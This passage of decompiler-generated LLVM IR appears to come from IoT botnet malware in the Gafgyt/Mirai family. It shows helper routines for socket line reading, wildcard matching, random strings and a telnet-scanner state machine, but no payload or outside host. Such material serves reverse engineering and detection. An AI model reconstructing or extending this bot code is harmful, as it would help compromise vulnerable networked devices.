  store i32 %v2_9100, i32* @r0, align 4
  %v2_9118 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 2)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9128 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 3)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9138 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 1)
  %v2_9140 = ptrtoint i32* %stack_var_-148 to i32
  %v3_914c = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_914c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_914c, i32 %v2_9140)
  %v2_916c = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9194, %dec_label_pc_90f8
  %v2_9160 = load i32, i32* @global_var_27b48.37, align 4
  %v2_9164 = add i32 %v2_9160, %v3_90cc
  %v1_9168 = inttoptr i32 %v2_9164 to i32*
  %v2_9168 = load i32, i32* %v1_9168, align 4
  %v3_917c = call i32 @__libc_waitpid(i32 %v2_9168, i32 %v2_916c, i32 0)
  %v3_918c = icmp eq i32 %v3_917c, -1
  %v8_918c = icmp eq i32 %v3_917c, -1
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91a8

dec_label_pc_9194:                                ; preds = %dec_label_pc_9150
  %v0_9194 = call i32 @__errno_location()
  %v1_919c = inttoptr i32 %v0_9194 to i32*
  %v2_919c = load i32, i32* %v1_919c, align 4
  %v7_91a0 = icmp eq i32 %v2_919c, 4
  br i1 %v7_91a0, label %dec_label_pc_9150, label %dec_label_pc_91a8

dec_label_pc_91a8:                                ; preds = %dec_label_pc_9150, %dec_label_pc_9194
  %v3_91b8 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_91b8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_91b8, i32 0)
  %v3_91c0 = mul i32 %tmp5, 4
  %v2_91cc = load i32, i32* @global_var_27b48.37, align 4
  %v2_91d0 = add i32 %v2_91cc, %v3_91c0
  %v2_91d8 = inttoptr i32 %v2_91d0 to i32*
  store i32 0, i32* %v2_91d8, align 4
  br i1 %v8_918c, label %dec_label_pc_9214, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_91a8
  %v3_91e8 = load i32, i32* %stack_var_-280, align 4
  %v1_91f4 = and i32 %v3_91e8, ptrtoint (i32* @global_var_ff00.45 to i32)
  %v3_91f8 = sdiv i32 %v1_91f4, 256
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91e8, %dec_label_pc_91a8, %entry, %dec_label_pc_90c8
  %storemerge3 = phi i32 [ -1, %dec_label_pc_90c8 ], [ -1, %entry ], [ %v3_91f8, %dec_label_pc_91e8 ], [ -1, %dec_label_pc_91a8 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_9100, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_90cc, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_27b48.37, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91a8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_9228 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9228, i32* @ip, align 4
  br label %dec_label_pc_9298

dec_label_pc_9258:                                ; preds = %dec_label_pc_92a8
  store i32 %v2_92b4, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9274 = call i32 @__libc_read(i32 %arg3)
  %v1_9284 = add nuw i32 %storemerge25, 1
  %v7_9290 = icmp eq i32 %v1_9274, 1
  br i1 %v7_9290, label %dec_label_pc_9298, label %dec_label_pc_92c8

dec_label_pc_9298:                                ; preds = %entry, %dec_label_pc_9258
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9284, %dec_label_pc_9258 ]
  %v6_92a4 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92a4, label %dec_label_pc_92a8, label %dec_label_pc_92c8

dec_label_pc_92a8:                                ; preds = %dec_label_pc_9298
  %v2_92b4 = add i32 %storemerge25, %arg1
  %v1_92b8 = add i32 %v2_92b4, -1
  %v1_92bc = inttoptr i32 %v1_92b8 to i8*
  %v2_92bc = load i8, i8* %v1_92bc, align 1
  %v7_92c0 = icmp eq i8 %v2_92bc, 10
  br i1 %v7_92c0, label %dec_label_pc_92c8, label %dec_label_pc_9258

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a8, %dec_label_pc_9298, %dec_label_pc_9258
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92a8 ], [ 1, %dec_label_pc_9298 ], [ %v1_9274, %dec_label_pc_9258 ]
  %v2_92cc = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_92cc, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_92b4, { 1, 0 }
  uselistorder i32 %v1_9274, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9298, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_934c4 = load i8, i8* %arg1, align 1
  %v2_93506 = icmp eq i8 %v2_934c4, 0
  br i1 %v2_93506, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9318:                                ; preds = %dec_label_pc_9358
  %v3_931c = mul i32 %stack_var_-20.07, 16
  %v4_9320 = ptrtoint i8* %v3_933c to i32
  %v2_9324 = load i8, i8* %v3_933c, align 1
  %v3_9324 = zext i8 %v2_9324 to i32
  %v4_9330 = mul nuw nsw i32 %v3_9324, 4
  %v5_9330 = add i32 %v4_9330, ptrtoint (i32* @global_var_19038.47 to i32)
  %v6_9330 = inttoptr i32 %v5_9330 to i32*
  %v7_9330 = load i32, i32* %v6_9330, align 4
  %v2_9334 = or i32 %v7_9330, %v3_931c
  %v1_9340 = add i32 %v4_9320, 1
  %v5_9344 = inttoptr i32 %v1_9340 to i8*
  %v2_934c = load i8, i8* %v5_9344, align 1
  %v2_9350 = icmp eq i8 %v2_934c, 0
  br i1 %v2_9350, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9358:                                ; preds = %entry, %dec_label_pc_9318
  %v3_933c = phi i8* [ %v5_9344, %dec_label_pc_9318 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_9334, %dec_label_pc_9318 ], [ 0, %entry ]
  %v1_935c = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_935c, label %dec_label_pc_9364, label %dec_label_pc_9318

dec_label_pc_9364:                                ; preds = %dec_label_pc_9318, %dec_label_pc_9358, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_9334, %dec_label_pc_9318 ], [ %stack_var_-20.07, %dec_label_pc_9358 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9358, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_937c = load i32, i32* @r4, align 4
  %v6_937c = load i32, i32* @fp, align 4
  store i32 37764, i32* %stack_var_-4, align 4
  %v2_9380 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9380, i32* @fp, align 4
  %v2_9394 = load i8, i8* %arg1, align 1
  %v7_93a0 = icmp eq i8 %v2_9394, 42
  br i1 %v7_93a0, label %dec_label_pc_93d4, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %entry
  %v7_93ac = icmp eq i8 %v2_9394, 63
  br i1 %v7_93ac, label %dec_label_pc_9444, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  %v2_93b8 = icmp eq i8 %v2_9394, 0
  br i1 %v2_93b8, label %dec_label_pc_93c4, label %dec_label_pc_949c

dec_label_pc_93c4:                                ; preds = %dec_label_pc_93b4
  %v2_93c8 = load i8, i8* %tmp, align 1
  %v3_93c8 = zext i8 %v2_93c8 to i32
  br label %dec_label_pc_9510

dec_label_pc_93d4:                                ; preds = %entry
  %v1_93d8 = add i32 %tmp8, 1
  %v3_93e4 = inttoptr i32 %v1_93d8 to i8*
  %v4_93e4 = call i32 @wildString(i8* %v3_93e4, i32 %arg2)
  %v2_93ec = icmp eq i32 %v4_93e4, 0
  br i1 %v2_93ec, label %dec_label_pc_9430, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %dec_label_pc_93d4
  %v2_93f8 = load i8, i8* %tmp, align 1
  %v2_93fc = icmp eq i8 %v2_93f8, 0
  br i1 %v2_93fc, label %dec_label_pc_9438, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_93f4
  %v1_9408 = add i32 %arg2, 1
  %v4_9414 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9408)
  %v2_941c = icmp eq i32 %v4_9414, 0
  br i1 %v2_941c, label %dec_label_pc_9430, label %dec_label_pc_9438

dec_label_pc_9430:                                ; preds = %dec_label_pc_9404, %dec_label_pc_93d4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_93f4, %dec_label_pc_9404, %dec_label_pc_9430
  %storemerge3 = phi i32 [ 0, %dec_label_pc_9430 ], [ 1, %dec_label_pc_9404 ], [ 1, %dec_label_pc_93f4 ]
  br label %dec_label_pc_9510

dec_label_pc_9444:                                ; preds = %dec_label_pc_93a8
  %v2_9448 = load i8, i8* %tmp, align 1
  %v2_944c = icmp eq i8 %v2_9448, 0
  br i1 %v2_944c, label %dec_label_pc_9490, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9444
  %v1_9458 = add i32 %tmp8, 1
  %v1_9460 = add i32 %arg2, 1
  %v2_946c = inttoptr i32 %v1_9458 to i8*
  %v3_946c = call i32 @wildString(i8* %v2_946c, i32 %v1_9460)
  %v2_9474 = icmp ne i32 %v3_946c, 0
  %. = zext i1 %v2_9474 to i32
  br label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9454, %dec_label_pc_9444
  %storemerge2 = phi i32 [ 1, %dec_label_pc_9444 ], [ %., %dec_label_pc_9454 ]
  br label %dec_label_pc_9510

dec_label_pc_949c:                                ; preds = %dec_label_pc_93b4
  %v2_94a0 = load i8, i8* %arg1, align 1
  %v3_94a0 = zext i8 %v2_94a0 to i32
  %v1_94a8 = call i32 @__GI_toupper(i32 %v3_94a0)
  store i32 %v1_94a8, i32* @r4, align 4
  %v2_94b4 = load i8, i8* %tmp, align 1
  %v3_94b4 = zext i8 %v2_94b4 to i32
  %v1_94bc = call i32 @__GI_toupper(i32 %v3_94b4)
  %v0_94c4 = load i32, i32* @r4, align 4
  %v9_94c4 = icmp eq i32 %v0_94c4, %v1_94bc
  br i1 %v9_94c4, label %dec_label_pc_94cc, label %dec_label_pc_9508

dec_label_pc_94cc:                                ; preds = %dec_label_pc_949c
  %v1_94d0 = add i32 %tmp8, 1
  %v1_94d8 = add i32 %arg2, 1
  %v2_94e4 = inttoptr i32 %v1_94d0 to i8*
  %v3_94e4 = call i32 @wildString(i8* %v2_94e4, i32 %v1_94d8)
  %v2_94ec = icmp ne i32 %v3_94e4, 0
  %.7 = zext i1 %v2_94ec to i32
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94cc, %dec_label_pc_949c
  %storemerge = phi i32 [ 1, %dec_label_pc_949c ], [ %.7, %dec_label_pc_94cc ]
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9490, %dec_label_pc_9438, %dec_label_pc_93c4, %dec_label_pc_9508
  %stack_var_-44.0 = phi i32 [ %storemerge3, %dec_label_pc_9438 ], [ %storemerge2, %dec_label_pc_9490 ], [ %v3_93c8, %dec_label_pc_93c4 ], [ %storemerge, %dec_label_pc_9508 ]
  store i32 %v3_937c, i32* @r4, align 4
  store i32 %v6_937c, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9510, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9438, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9540 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9540, i32* %arg2, align 4
  %v3_9558 = icmp eq i32 %v1_9540, -1
  %. = zext i1 %v3_9558 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9594 = load i32, i32* %r0.global-to-local, align 4
  %storemerge1 = inttoptr i32 %v0_9594 to i8*
  store i8* %storemerge1, i8** %stack_var_-20, align 4
  %v2_95cc2 = load i8, i8* %storemerge1, align 1
  %v2_95d04 = icmp eq i8 %v2_95cc2, 0
  br i1 %v2_95d04, label %dec_label_pc_95d8, label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %entry, %dec_label_pc_959c
  %v2_95d87 = phi i8* [ %storemerge, %dec_label_pc_959c ], [ %storemerge1, %entry ]
  %v2_95a0 = load i8, i8* %v2_95d87, align 1
  %v3_95a0 = zext i8 %v2_95a0 to i32
  store i32 %v3_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = call i32 @__GI_toupper(i32 %v3_95a0)
  store i32 %v1_95a8, i32* %r0.global-to-local, align 4
  %v3_95b4 = load i8*, i8** %stack_var_-20, align 4
  %v1_95b8 = trunc i32 %v1_95a8 to i8
  store i8 %v1_95b8, i8* %v3_95b4, align 1
  %v4_95bc = ptrtoint i8* %v3_95b4 to i32
  %v1_95c0 = add i32 %v4_95bc, 1
  %storemerge = inttoptr i32 %v1_95c0 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_95cc = load i8, i8* %storemerge, align 1
  %v2_95d0 = icmp eq i8 %v2_95cc, 0
  br i1 %v2_95d0, label %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, label %dec_label_pc_959c

dec_label_pc_95c8.dec_label_pc_95d8_crit_edge:    ; preds = %dec_label_pc_959c
  %v13_95d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, %entry
  %v13_95d8 = phi i32 [ %v13_95d8.pre, %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge ], [ %v0_9594, %entry ]
  ret i32 %v13_95d8

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_95e0 = load i32, i32* @r4, align 4
  %v6_95e0 = load i32, i32* @fp, align 4
  %v0_95ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_965817 = icmp sgt i32 %arg2, 0
  br i1 %v5_965817, label %dec_label_pc_9608, label %dec_label_pc_965c

dec_label_pc_9608:                                ; preds = %entry, %dec_label_pc_9608
  %storemerge118 = phi i32 [ %v1_9644, %dec_label_pc_9608 ], [ 0, %entry ]
  %v2_9614 = add i32 %storemerge118, %v0_95ec
  store i32 %v2_9614, i32* @r4, align 4
  %v0_9618 = call i32 @rand_cmwc()
  %v2_9628 = urem i32 %v0_9618, 26
  store i32 %v2_9628, i32* %r0.global-to-local, align 4
  %v1_9634 = add nuw nsw i32 %v2_9628, 65
  %v1_963c = trunc i32 %v1_9634 to i8
  %v2_963c = load i32, i32* @r4, align 4
  %v3_963c = inttoptr i32 %v2_963c to i8*
  store i8 %v1_963c, i8* %v3_963c, align 1
  %v1_9644 = add i32 %storemerge118, 1
  %v3_9650.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9658 = icmp slt i32 %v1_9644, %v3_9650.pre
  br i1 %v5_9658, label %dec_label_pc_9608, label %dec_label_pc_964c.dec_label_pc_965c_crit_edge

dec_label_pc_964c.dec_label_pc_965c_crit_edge:    ; preds = %dec_label_pc_9608
  %v12_9660.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_965c

dec_label_pc_965c:                                ; preds = %dec_label_pc_964c.dec_label_pc_965c_crit_edge, %entry
  %v12_9660 = phi i32 [ %v12_9660.pre, %dec_label_pc_964c.dec_label_pc_965c_crit_edge ], [ %v0_95ec, %entry ]
  store i32 %v3_95e0, i32* @r4, align 4
  store i32 %v6_95e0, i32* @fp, align 4
  ret i32 %v12_9660

; uselistorder directives
  uselistorder i32 %v1_9644, { 1, 0 }
  uselistorder label %dec_label_pc_9608, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_96b8.lr.ph:
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9668 = load i32, i32* @fp, align 4
  store i32 %v3_9668, i32* %stack_var_-16, align 4
  store i32 38512, i32* %stack_var_-4, align 4
  %v2_966c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_966c, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_9690 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_96a4 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_96b8

dec_label_pc_96b8:                                ; preds = %dec_label_pc_96b8.lr.ph, %dec_label_pc_96b8
  %storemerge426 = phi i32 [ 0, %dec_label_pc_96b8.lr.ph ], [ %v1_96cc, %dec_label_pc_96b8 ]
  %v5_96c4 = mul nuw nsw i32 %storemerge426, 4
  %v6_96c4 = add i32 %v5_96c4, %v2_96a4
  %v7_96c4 = inttoptr i32 %v6_96c4 to i32*
  store i32 0, i32* %v7_96c4, align 4
  %v1_96cc = add nuw nsw i32 %storemerge426, 1
  %tmp51 = icmp ult i32 %v1_96cc, 32
  br i1 %tmp51, label %dec_label_pc_96b8, label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_96b8
  %v13_9668 = ptrtoint i32* %stack_var_-16 to i32
  %v3_96e4 = udiv i32 %arg1, 32
  %v3_96f0 = mul nuw nsw i32 %v3_96e4, 4
  %v2_96f8 = add nsw i32 %v3_96f0, -160
  %v2_96fc = add i32 %v2_96f8, %v13_9668
  %v1_9700 = inttoptr i32 %v2_96fc to i32*
  %v2_9700 = load i32, i32* %v1_9700, align 4
  %v1_9708 = urem i32 %arg1, 32
  %v6_9710 = shl i32 1, %v1_9708
  %v2_9714 = or i32 %v2_9700, %v6_9710
  store i32 %v2_9714, i32* %v1_9700, align 4
  %v1_9734 = add i32 %arg1, 1
  %v2_9740 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9754 = call i32 @__libc_select(i32 %v1_9734, i32 %v2_96a4, i32 0, i32 %v2_96a4, i32 %v2_9740)
  %v5_9768 = icmp sgt i32 %v5_9754, 0
  br i1 %v5_9768, label %dec_label_pc_98fc.preheader, label %dec_label_pc_9868.preheader

dec_label_pc_9868.preheader:                      ; preds = %dec_label_pc_96e0
  %v7_987022 = icmp slt i32 %tmp32, 10
  br i1 %v7_987022, label %dec_label_pc_97a8.lr.ph, label %dec_label_pc_98fc.preheader

dec_label_pc_97a8.lr.ph:                          ; preds = %dec_label_pc_9868.preheader, %dec_label_pc_985c
  %stack_var_-44.023 = phi i32 [ %v1_9860, %dec_label_pc_985c ], [ %tmp32, %dec_label_pc_9868.preheader ]
  %v2_9774 = load i32, i32* @global_var_23b28.49, align 4
  %v3_9780 = call i32 @Rootsprintf(i32 %v2_9774, i32 ptrtoint ([5 x i8]* @global_var_19438.51 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_97a8

dec_label_pc_97a8:                                ; preds = %dec_label_pc_97a8.lr.ph, %dec_label_pc_97a8
  %storemerge514 = phi i32 [ 0, %dec_label_pc_97a8.lr.ph ], [ %v1_97bc, %dec_label_pc_97a8 ]
  %v5_97b4 = mul nuw nsw i32 %storemerge514, 4
  %v6_97b4 = add i32 %v5_97b4, %v2_96a4
  %v7_97b4 = inttoptr i32 %v6_97b4 to i32*
  store i32 0, i32* %v7_97b4, align 4
  %v1_97bc = add nuw nsw i32 %storemerge514, 1
  %tmp52 = icmp ult i32 %v1_97bc, 32
  br i1 %tmp52, label %dec_label_pc_97a8, label %dec_label_pc_97d0

dec_label_pc_97d0:                                ; preds = %dec_label_pc_97a8
  %v2_97f0 = load i32, i32* %v1_9700, align 4
  %v2_9804 = or i32 %v2_97f0, %v6_9710
  store i32 %v2_9804, i32* %v1_9700, align 4
  store i32 0, i32* @r2, align 4
  %v5_9844 = call i32 @__libc_select(i32 %v1_9734, i32 %v2_96a4, i32 0, i32 %v2_96a4, i32 %v2_9740)
  %v5_9858 = icmp sgt i32 %v5_9844, 0
  br i1 %v5_9858, label %dec_label_pc_98fc.preheader, label %dec_label_pc_985c

dec_label_pc_985c:                                ; preds = %dec_label_pc_97d0
  %v1_9860 = add nsw i32 %stack_var_-44.023, 1
  %v7_9870 = icmp slt i32 %v1_9860, 10
  br i1 %v7_9870, label %dec_label_pc_97a8.lr.ph, label %dec_label_pc_98fc.preheader

dec_label_pc_98fc.preheader:                      ; preds = %dec_label_pc_985c, %dec_label_pc_97d0, %dec_label_pc_9868.preheader, %dec_label_pc_96e0
  %v5_98a4 = bitcast i8* %stack_var_-185 to i32*
  %not.v7_990456 = icmp sgt i32 %arg3, 1
  %v2_991c58 = icmp eq i1 %not.v7_990456, false
  br i1 %v2_991c58, label %dec_label_pc_9924, label %dec_label_pc_9888

dec_label_pc_9888:                                ; preds = %dec_label_pc_98fc.preheader, %dec_label_pc_98f0
  %v1_990061.in = phi i32 [ %v1_990061, %dec_label_pc_98f0 ], [ %arg3, %dec_label_pc_98fc.preheader ]
  %stack_var_-40.060 = phi i8* [ %v5_98e0, %dec_label_pc_98f0 ], [ %arg2, %dec_label_pc_98fc.preheader ]
  %stack_var_-36.059 = phi i32 [ %v1_98f4, %dec_label_pc_98f0 ], [ 0, %dec_label_pc_98fc.preheader ]
  %v1_990061 = add i32 %v1_990061.in, -1
  %v2_988c = load i32, i32* @global_var_23b28.49, align 4
  %v6_98a4 = call i32 @__libc_recv(i32 %v2_988c, i32* %v5_98a4, i32 1, i32 0, i32 %v1_990061)
  %v7_98ac = icmp eq i32 %v6_98a4, 1
  br i1 %v7_98ac, label %dec_label_pc_98cc, label %dec_label_pc_98b4

dec_label_pc_98b4:                                ; preds = %dec_label_pc_9888
  store i8 0, i8* %stack_var_-40.060, align 1
  br label %dec_label_pc_9938

dec_label_pc_98cc:                                ; preds = %dec_label_pc_9888
  %v3_98cc = load i8, i8* %stack_var_-185, align 1
  %v4_98d0 = ptrtoint i8* %stack_var_-40.060 to i32
  store i8 %v3_98cc, i8* %stack_var_-40.060, align 1
  %v1_98dc = add i32 %v4_98d0, 1
  %v5_98e0 = inttoptr i32 %v1_98dc to i8*
  %v3_98e4 = load i8, i8* %stack_var_-185, align 1
  %v7_98e8 = icmp eq i8 %v3_98e4, 10
  br i1 %v7_98e8, label %dec_label_pc_9924, label %dec_label_pc_98f0

dec_label_pc_98f0:                                ; preds = %dec_label_pc_98cc
  %v1_98f4 = add i32 %stack_var_-36.059, 1
  %not.v7_9904 = icmp sgt i32 %v1_990061, 1
  %v2_991c = icmp eq i1 %not.v7_9904, false
  br i1 %v2_991c, label %dec_label_pc_9924, label %dec_label_pc_9888

dec_label_pc_9924:                                ; preds = %dec_label_pc_98cc, %dec_label_pc_98f0, %dec_label_pc_98fc.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_98fc.preheader ], [ %v1_98f4, %dec_label_pc_98f0 ], [ %stack_var_-36.059, %dec_label_pc_98cc ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_98fc.preheader ], [ %v5_98e0, %dec_label_pc_98f0 ], [ %v5_98e0, %dec_label_pc_98cc ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_9938

dec_label_pc_9938:                                ; preds = %dec_label_pc_98b4, %dec_label_pc_9924
  %storemerge = phi i32 [ -1, %dec_label_pc_98b4 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_9924 ]
  %v2_9944 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_9944, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_990061, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.060, { 1, 2, 0 }
  uselistorder i32 %v1_9860, { 1, 0 }
  uselistorder i32 %storemerge514, { 1, 0 }
  uselistorder i32 %storemerge426, { 1, 0 }
  uselistorder i32 %v2_96a4, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9938, { 1, 0 }
  uselistorder label %dec_label_pc_9924, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9888, { 1, 0 }
  uselistorder label %dec_label_pc_97a8, { 1, 0 }
  uselistorder label %dec_label_pc_97a8.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_9954 = load i32, i32* @fp, align 4
  store i32 39260, i32* %stack_var_-4, align 4
  %v2_9958 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9958, i32* @fp, align 4
  %v1_9968 = add i32 %arg1, 4
  %v2_9968 = inttoptr i32 %v1_9968 to i32*
  %v3_9968 = load i32, i32* %v2_9968, align 4
  store i32 %v3_9968, i32* @r0, align 4
  %v1_9974 = call i32 @__GI_inet_ntoa(i32 %v3_9968)
  store i32 %v3_9954, i32* @fp, align 4
  ret i32 %v1_9974

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_998c = load i32, i32* @fp, align 4
  store i32 39316, i32* %stack_var_-4, align 4
  %v2_9990 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9990, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_99b8 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_99cc = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_99dc = load i8, i8* %arg3, align 1
  %v2_99e0 = icmp eq i8 %v2_99dc, -1
  br i1 %v2_99e0, label %dec_label_pc_99e8, label %dec_label_pc_99f8

dec_label_pc_99e8:                                ; preds = %entry
  %v3_99dc = zext i8 %v2_99dc to i32
  %v6_99f4 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_99dc, i32 %v5_99cc)
  br label %dec_label_pc_99f8

dec_label_pc_99f8:                                ; preds = %entry, %dec_label_pc_99e8
  %v3_99fc = load i32, i32* %stack_var_0, align 4
  %v3_9a00 = call i32 @contains_string(i32 %tmp, i32 %v3_99fc)
  %v2_9a08 = icmp ne i32 %v3_9a00, 0
  %. = zext i1 %v2_9a08 to i32
  store i32 %v3_998c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_99dc, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_99f8, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a78.lr.ph:
  %stack_var_-160 = alloca i32, align 4
